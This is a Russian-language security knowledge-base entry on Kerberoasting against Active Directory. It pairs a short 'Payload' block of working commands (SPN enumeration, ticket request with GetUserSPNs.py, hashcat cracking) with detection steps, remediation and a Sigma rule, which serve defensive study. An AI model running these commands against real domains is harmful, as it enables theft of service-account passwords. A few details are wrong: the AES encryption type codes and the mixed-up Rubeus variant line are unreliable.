---
id: ad-kerberoasting-spn
title: "Kerberoasting: подбор паролей сервисных учёток по SPN"
type: ad
target: active-directory
category: active-directory
difficulty: intermediate
bypass: auth
tags: [kerberos, spn, password-cracking, service-accounts, active-directory]
tested_on: ["Windows Server 2019/2022 DC", "учётки с SPN и «человеческими» паролями"]
success_rate: 0.6
risk: high
cwe: "CWE-521"
lab: null
last_verified: "2026-10-23"
references:
  - "https://adsecurity.org/"
  - "https://attack.mitre.org/tactics/TA0006/"
  - "https://attack.mitre.org/techniques/T1558/003/"
graph:
  - target: "kerberos"
    type: instance_of
  - target: "credential-access"
    type: leads_to
  - target: "bruteforce"
    type: related_to
  - target: "active-directory"
    type: related_to
  - target: "privilege-escalation"
    type: leads_to
---

# Kerberoasting: подбор паролей сервисных учёток по SPN

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# 1) найти учётки с SPN (нужны права обычного пользователя домена)
ldapsearch -x -H ldap://dc01.lab.local -b 'DC=lab,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName

# 2) запросить сервисный билет (TGS-REP) и выгрузить хеш для офлайн-подбора
GetUserSPNs.py lab.local/user:'Passw0rd!' -dc-ip 10.10.10.5 -request -outputfile spn.hash

# 3) офлайн-подбор (тип хеша Kerberos 5 TGS-REP etype 23 = RC4)
hashcat -m 13100 spn.hash wordlists/passwords/service-accounts.txt
```

## Explanation

Сервисный билет (TGS-REP) зашифрован ключом, производным от пароля **сервисной
учётки**. Любой аутентифицированный пользователь домена может запросить билет
к любому SPN, а затем подбирать пароль офлайн — контроллер домена при этом
не видит попыток входа и не блокирует учётку.

Уязвимость не в Kerberos, а в практике: сервисным учёткам задают «человеческие»
пароли (`SqlService2019!`) и не меняют годами, потому что «иначе служба
остановится».

Красный флаг в конфигурации: билеты с шифрованием **RC4 (etype 23)** вместо
AES128/256 — RC4-хеш подбирается на порядки быстрее, а его наличие часто
означает, что пароль не менялся с эпохи Server 2008.

Условия успеха: учётка с SPN, пароль ≤ 20 символов и не случайный,
отсутствие gMSA, отсутствие мониторинга аномальных TGS-запросов.

## Detection

1. **Инвентаризация**: все учётки с непустым `servicePrincipalName`
   (`Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName`).
2. **Event 4769** (TGS-запрос): аномалии —
   - десятки/сотни запросов к разным SPN от одной учётки за минуты;
   - `Ticket Encryption Type = 0x17` (RC4) там, где ожидается AES (0x17/0x18);
   - запросы к SPN, к которым данная учётка обычно не обращается.
3. **Event 4768/4771** — массовые AS-запросы перед «обходом» домена.
4. Сетевой признак: всплеск LDAP-запросов с фильтром `servicePrincipalName=*`
   от рабочей станции пользователя.
5. В логах приложений: ошибки входа сервисов после смены пароля — признак,
   что пароль сервисной учётки кто-то менял (в т.ч. злоумышленник).

## Remediation

- **gMSA** (Group Managed Service Accounts) для всех служб Windows:
  120-символьные случайные пароли, автоматическая ротация каждые 30 дней,
  хранение в AD и выдача только разрешённым хостам. Kerberoasting теряет смысл.
- Для не-Windows служб — секрет-менеджер (Vault/Azure Key Vault/Secrets Manager)
  с короткоживущими учётными данными, не «вечный пароль в конфиге».
- Пароли сервисных учёток: ≥ 25 символов, случайные, уникальные; запрет
  интерактивного входа и членства в привилегированных группах.
- Принудительное AES-шифрование билетов: отключить RC4
  (`msDS-SupportedEncryptionTypes = AES256`), `Do not use Kerberos RC4`-политика.
- Мониторинг 4769 с алертами на аномальное число TGS-запросов и на RC4.
- Tiering: сервисные учётки Tier 1 не должны быть в группах Tier 0.
- Регулярный офлайн-аудит: запросить билеты к своим SPN и прогнать подбор
  в изолированном стенде (это законная проверка стойкости).

## Variants

```
Rubeus kerberoast /asreproast (Windows)
```

```
SetSPN-перечисление через PowerView
```


## Detection rules

```yaml
title: Возможный Kerberoasting — аномальные TGS-запросы
id: a1b2c3d4-0001-4a1b-9c1d-000000000001
status: experimental
description: >-
  Одна учётка запрашивает сервисные билеты ко многим разным SPN за короткое время,
  либо используется шифрование RC4 (etype 0x17) для сервисного билета.
references:
  - https://attack.mitre.org/techniques/T1558/003/
logsource:
  product: windows
  service: security
  definition: 'Требуется аудит Kerberos Authentication Service (Event 4769)'
detection:
  selection_rc4:
    EventID: 4769
    TicketEncryptionType: '0x17'
  selection_volume:
    EventID: 4769
  timeframe: 5m
  condition: selection_rc4 or (selection_volume | count(ServiceName) by LogonAccount > 15)
falsepositives:
  - сервисные учётки, легитимно обращающиеся к множеству SPN (брокеры, мониторинг)
  - миграции и массовые перезапуски служб
level: high
tags: [attack.credential_access, attack.t1558.003]
```
